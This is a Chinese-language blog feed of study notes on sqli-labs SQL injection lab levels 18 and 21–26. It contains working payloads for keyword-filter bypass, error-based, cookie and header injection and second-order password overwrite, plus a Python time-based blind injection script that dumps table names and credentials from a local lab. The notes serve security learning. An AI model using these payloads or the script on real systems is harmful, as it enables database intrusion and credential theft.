      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-12</title>
    <link href="/2025/03/13/note-12/"/>
    <url>/2025/03/13/note-12/</url>
    
    <content type="html"><![CDATA[<h1 id="less-25-字符过滤绕过"><a href="#less-25-字符过滤绕过" class="headerlink" title="less-25 字符过滤绕过"></a>less-25 字符过滤绕过</h1><p>由题目可知道过滤了or和and，大小写没用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out OR (non case sensitive)</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out AND (non case sensitive)</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>i表示不敏感大小写，这样的话想用报错注入就要进行绕过了  </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">and可以用<span class="hljs-meta">&amp;&amp;</span><br>or可以用<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure><p>也有双写绕过</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">输入<br>oorr<br>进行过滤后会变成<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword"></span>实现绕过<br><br>同理<br>输入aandnd<br>经过过滤变成<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure><p>当然可以直接用联合注入法：<br>注意要绕过字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs payload">?id=&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+<br><br>?id=&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; aandnd table_schema=&#x27;security&#x27;--+<br><br>information要换成infoorrmation。<br>and要换成&amp;&amp;或者aandnd。<br></code></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,&#x27;!&#x27;,passwoorrd) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br><br>passsword要换成passwoord<br></code></pre></td></tr></table></figure><h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>要求使用盲注，而且像上题一样过滤or和and，<br>测试了好一会，发现根本不需要闭合  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <br></code></pre></td></tr></table></figure><p>题目可以直接联合注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,passwoorrd) <span class="hljs-keyword">from</span> users <br></code></pre></td></tr></table></figure><p>但是本意应该是让练习盲注的，所以修改了一下以前的脚本<br>时间盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入requests库，用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># 导入time库，用于测量时间延迟</span><br><br><span class="hljs-comment"># 定义一个包含可能字符的字符串，用于猜测数据库、表和字段的名称</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># 定义一个时间延迟，用于判断是否存在SQL注入</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 定义目标URL，其中包含一个SQL注入的payload模板</span><br><span class="hljs-comment"># &#123;sql&#125;：表示要执行的SQL查询</span><br><span class="hljs-comment"># &#123;position&#125;：表示当前猜测的字符位置</span><br><span class="hljs-comment"># &#123;char&#125;：表示当前猜测的字符</span><br><span class="hljs-comment"># &#123;time&#125;：表示延迟时间</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-25a/?id=1 aandnd if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># 定义一个函数，用于发送HTTP请求并判断是否存在延迟</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># 记录请求开始时间</span><br>    response = requests.get(path)  <span class="hljs-comment"># 发送HTTP GET请求</span><br>    end = time.time()   <span class="hljs-comment"># 记录请求结束时间</span><br>    <span class="hljs-comment"># 如果响应状态码为200且响应时间超过预设的延迟时间，则认为存在SQL注入</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义一个函数，用于提取数据库、表、字段或数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 初始化一个空字符串，用于存储结果</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化字符位置计数器</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># 每次循环增加字符位置</span><br>        <span class="hljs-comment"># 尝试猜测当前字符位置是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果为空，退出循环</span><br>        <span class="hljs-comment"># 遍历所有可能的字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># 构造完整的URL并发送请求</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># 如果猜测正确，将字符添加到结果字符串中</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># 退出循环，继续下一个字符</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回最终结果字符串</span><br><br><span class="hljs-comment"># 获取数据库名</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># 调用extract_data函数，传入SQL查询语句获取数据库名</span><br><br><span class="hljs-comment"># 获取表名</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># 获取字段名</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># 获取用户名和密码，可以替换自己想要的表名</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure><h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//strip out OR (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out AND (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//strip out /*</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out --</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out <span class="hljs-comment">#</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out spaces</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out slashes</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></code></pre></td></tr></table></figure><p>\s &#x3D; 空格<br>大概就是空格，制表符，换行符都过滤了,  </p><blockquote><p>注释可以用;%00<br>空格绕过%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格空格，但是可能是apache解析不了(我用的也是apache)，博客上都选择报错注入加()绕过空格,就不用考虑空格<br>or 可以用 || 或 oorr<br>and 可以用 &amp;&amp; 或 aandnd  </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">||</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(concat(username,<span class="hljs-operator">%</span><span class="hljs-number">27</span>:<span class="hljs-operator">%</span><span class="hljs-number">27</span>,passwoorrd))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(users)<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span>(id<span class="hljs-operator">=</span><span class="hljs-number">1</span>))));<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br><span class="hljs-operator">=</span><br><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(select(concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password))from(users)where(id=1))));</span><br><span class="hljs-string"></span><br><span class="hljs-string">https://blog.csdn.net/2301_76913435/article/details/145601627</span><br></code></pre></td></tr></table></figure><p>其中包含：双写or，;%00绕过注释符号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.cnblogs.com<span class="hljs-operator">/</span>linfangnan<span class="hljs-operator">/</span>p<span class="hljs-operator">/</span><span class="hljs-number">13940107.</span>html<br></code></pre></td></tr></table></figure><p>其中包含：双写or，||’1’&#x3D;’1’ 来闭合语句使得不用注释，security.users来确定是security下的users</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-11</title>
    <link href="/2025/03/12/note-11/"/>
    <url>/2025/03/12/note-11/</url>
    
    <content type="html"><![CDATA[<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>根据题目提示先登正确账户密码吗，然后bp抓包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-21/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-21/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>看到cookie中uname明显不是用来登录的admin,是admin经过base64加密后的字符</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br></code></pre></td></tr></table></figure><p>用赛博厨子解出来尽然是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4%3D<br>decode base64=<br>admin7<br></code></pre></td></tr></table></figure><p>怀疑是后面%3D是url字符，<br>将构建好的闭合点加密成base64后再上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4n<br>回显<br>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br></code></pre></td></tr></table></figure><p>最后测出闭合语句</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">uname=YWRtaW4nKSM=<br>base解码就是<br>uname=admin&#x27;)#<br></code></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoaWQsdXNlcm5hbWUsJyEnLHBhc3N3b3JkKSBmcm9tIHVzZXJzIw==<br></code></pre></td></tr></table></figure><h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>和上题解法一样，就是换了闭合点   </p><p>最终payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=IiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChpZCx1c2VybmFtZSwnIScscGFzc3dvcmQpIGZyb20gdXNlcnMj<br></code></pre></td></tr></table></figure><h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>看题目，<br>strip comment,看翻译是删除注释，不懂啥意思<br>看一眼网页源码，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">reg = <span class="hljs-string">&quot;/#/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">replace = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><br></code></pre></td></tr></table></figure><p>闭合点是’<br>但好像把#,–,这种注释给替换成空字符了，<br>有没有不用注释的方法呢，<br>注释的作用是把后面的语句无效化。<br>那试试绕过？双写绕过试试？<br>不行，实在试不出来，去看博客吧  </p><h2 id="采用闭合的方式："><a href="#采用闭合的方式：" class="headerlink" title="采用闭合的方式："></a>采用闭合的方式：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;</span> <br></code></pre></td></tr></table></figure><p>好像是拼入源码会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><p>对比</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select #&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">//若此出注释符被过滤,则会多出一个单引号导致无法注入</span><br><span class="hljs-comment">//被过滤后的结果</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="采用-00替换注释"><a href="#采用-00替换注释" class="headerlink" title="采用;%00替换注释"></a>采用;%00替换注释</h2><p>采用;%00替换注释：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;;<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure><blockquote><p>%00 是 URL 编码的空字符（\x00）  </p></blockquote><p>组合 ;%00 的完整逻辑<br>攻击者通过 ;%00 实现以下目标：</p><blockquote><p>结束当前语句：分号 ; 终止 UNION SELECT 查询。</p></blockquote><blockquote><p>截断后续内容：空字符 %00 让后端忽略原查询中可能存在的其他条件（如 LIMIT 1 或 AND 子句）。</p></blockquote><blockquote><p>绕过闭合引号：如果原查询的闭合引号在空字符后被截断，可能避免语法错误。</p></blockquote><p>最后payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; union select 1,2,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users;%00</span><br></code></pre></td></tr></table></figure><h1 id="less-24-二次注入"><a href="#less-24-二次注入" class="headerlink" title="less 24 二次注入"></a>less 24 二次注入</h1><blockquote><p>二次注入<br>二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。</p></blockquote><h2 id="看别的大佬博客"><a href="#看别的大佬博客" class="headerlink" title="看别的大佬博客"></a>看别的大佬博客</h2><p>在注册新用户中注册已有的用户名会提示不行，但是username没有被过滤，可从username下手。   </p><p>我们先注册一个账号名叫admin’#。可以看到我们成功将有污染的数据写入数据库。单引号是为了和之后密码修的用户名的单引号进行闭合，#是为了注释后面的数据。</p><p>之后也用户名admin’#和密码是123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。  </p><p>当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。  </p><blockquote><p>我的总结理解是在注册新用户时把有污染的数据写入数据库，当再修改admin’#时会直接把admin’#拼入修改的查询语句，而注释掉了原来验证原账号密码的部分</p></blockquote><p>原语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure><p>当登录admin’#并点修改密码时会出现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;1234&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure><p>这样就会变成修改admin的密码而不是admin’#的，并且会将后面验证admin密码的部分注释掉。</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-10</title>
    <link href="/2025/03/10/note-10/"/>
    <url>/2025/03/10/note-10/</url>
    
    <content type="html"><![CDATA[<h1 id="less18-可能是叫做报头注入"><a href="#less18-可能是叫做报头注入" class="headerlink" title="less18 可能是叫做报头注入"></a>less18 可能是叫做报头注入</h1><p>在有头部回显的状况下用  </p><p>如图payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#<br></code></pre></td></tr></table></figure><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/1.png" alt="1">  </p><p>因为源码里有检查三个参数，所以要输入三个参数，或者用</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br>```  <br>闭合，此时后端代码就会变成<br>```sql<br>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27;, &#x27;$IP&#x27;, $uname)&quot;;<br></code></pre></td></tr></table></figure><p>前后两端的’是为了闭合原有的单引号中间用and，or等连接即可。</p><blockquote><p>闭合单引号：通过’闭合原SQL语句中的单引号，确保语法正确。  </p></blockquote><blockquote><p>使用or：or用于确保即使原语句的条件不成立，我们的注入语句仍然会被执行。  </p></blockquote><blockquote><p>注入extractvalue()：extractvalue()函数被用来触发报错，concat(0x7e,database())将数据库名称与一个波浪号（0x7e是波浪号的十六进制表示）拼接，从而在报错信息中回显出数据库名称。  </p></blockquote><blockquote><p>闭合表达式：通过or ‘’闭合整个表达式，确保语法正确。  </p></blockquote><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/2.png" alt="2">  